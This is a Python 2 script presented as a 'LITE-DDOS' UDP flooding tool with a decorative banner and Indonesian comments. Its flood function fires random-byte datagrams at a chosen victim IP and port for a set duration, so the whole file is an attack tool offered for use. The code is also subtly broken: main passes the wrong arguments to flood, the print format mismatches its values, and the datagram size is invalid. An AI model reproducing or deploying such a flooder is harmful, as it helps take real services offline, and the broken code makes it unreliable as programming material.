# attacker handsome dgq
import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#----------------------[\033[1;91mLITE-DDOS\033[1;32m]----------------------#"
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mthis is:" "ddos udp attack command " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mCreator:DGQ-DEV    \033[1;32m##      ###       ##                #"
    print "#\033[1;91mTeam   :VH-TEAM    \033[1;32m##     #          ##                #"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
    print "#               \033[1;91m*---[VIET NAM Security Lite]---*        \033[1;32m#"
    print "#########################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
	#  "SOCK_DGRAM" itu  menunjukkan  UDP type program
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	# 2000000 representasi satu byte ke server
	byte = random._urandom(2000000)
	timeout = time.time() + duration
	sent = 6500

	while 1:
		if time.time() > timeout:
			break
		else:
			pass
		client.sendto(byte, (victim, vport))
		sent = sent + 100
		print "\033[1;91mAmount \033[1;32m%s \033[1;91mPacket Sent \033[1;91mPort server \033[1;32m%s "%(sent, victim, vport)	
def main():		
	print len(sys.argv)
	if len(sys.argv) != 4:
	   usage()
	else:
	   flood(sys.argv)

if __name__ == '__main__':	   
	main()
